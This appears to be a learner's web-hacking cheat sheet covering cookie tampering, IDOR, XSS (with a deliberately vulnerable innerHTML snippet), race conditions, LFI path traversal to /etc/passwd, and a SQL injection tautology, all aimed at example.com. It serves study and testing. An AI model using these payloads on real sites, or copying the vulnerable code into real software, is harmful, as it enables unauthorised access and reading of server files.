# Web hacking


## Common
**Cookie tampering**
  - curl -H "Cookie: logged_in=true; admin=true"example.com/cookie-test
  - Some websites might encode cookies so encode *Cookie: logged_in=true; admin=true"*

**Insecure Direct Object Reference(IDOR)**

_IDOR is a vulnerability that occurs when internal object are exposed without proper authorization checks._

    - INSPECT ELEMENT -> NETWORK -> customer_id.json -> id:10 USERNAME: name PASSWORD: password
    - example.com/profile?user_id=1 -> exploits the ID number -> example.com/profile?user_id=666

#Cros-site scripting (XSS)
*Cross-Site Scripting is a vulnerability that allows attackers to inject malicious scripts into web pages when user input is not properly sanitized or encoded.*

STORED - 
    - User input is stored on the server
    - Comment sections, forums, user profiles, and product reviews
    - Effects every user

### DOM BASED
This takes advantage of how **querySelector** is used in the sites javascript.

**VULNERABLE CODE**
```
<div id="output"></div>
<script>
  const params = new URLSearchParams(window.location.search);
  const name = params.get("name");
  // Vulnerable: Inserts untrusted input into the DOM
  document.querySelector("#output").innerHTML = "Hello, " + name;
</script>
```
https://example.com/?name=<script>alert('DOM XSS')</script>


## Race conditions
Requires Burp suite - reapter or intruder(pitchfork attack)

Sending multiple requests simultaneously may trigger race conditions, leading to unintended behavior.

**Such as**
 - Sending multipul withdraw checks before the system can check if theres avaialbae balance
 - Register the same email with diffrent accounts(abusing free trials)
 - Multipul uses of a gift card

## Local file inclusion

FLI is a web application vulnerability that allows an attacker to access files stored on the server 

__example.com/index.php?page=<ins>etc/password</ins>__

You can move up directories with ../../../../ -> __example.com/index.php?page=./../../../etc/password__

.. = parent directory

/ = directory separator

%00 = is a null byte, a special character that tells a computer, Stop reading here.

example.com/index.php?page=./../../../etc/password%00

* F-P-I-T-V-L
  * **file** - xample.com/index.php?file=../../../../etc/passwd
  * **page** - example.com/index.php?page=../../../../etc/passwd
  * **include** - example.com/index.php?include=../../../../etc/passwd
  * **template** - example.com/index.php?template=../../../../etc/passwd
  * **view** - example.com/index.php?view=../../../../etc/passwd
  * **lang** - example.com/index.php?lang=../../../../etc/passwd


Side Note:
_LFI is less common in modern applications due to improved security practices, but it still appears in older systems._


## SQL Injection
database vulnerability that allows an attacker to manipulate queries by injecting malicious SQL code into input fields.
This exploit occurs when user inputs are not properly validated or sanitized.

**It is possible to detect SQL injection vulnerabilities by observing delays in a website’s response time.**
* No Delay -> High probability there is no SQL injection vulnerability
* Delayed Response -> High probability of a SQL injection vulnerability

**example:**
' OR '1'='1

**Possible Vulnerable Inputs**
  * Username
  * password
  * cookies
  * search bar
  * form fields


Side Note:
_SQLMap is a powerful penetration  tool used for detecting and exploiting sql vulnerabilities in web applications._


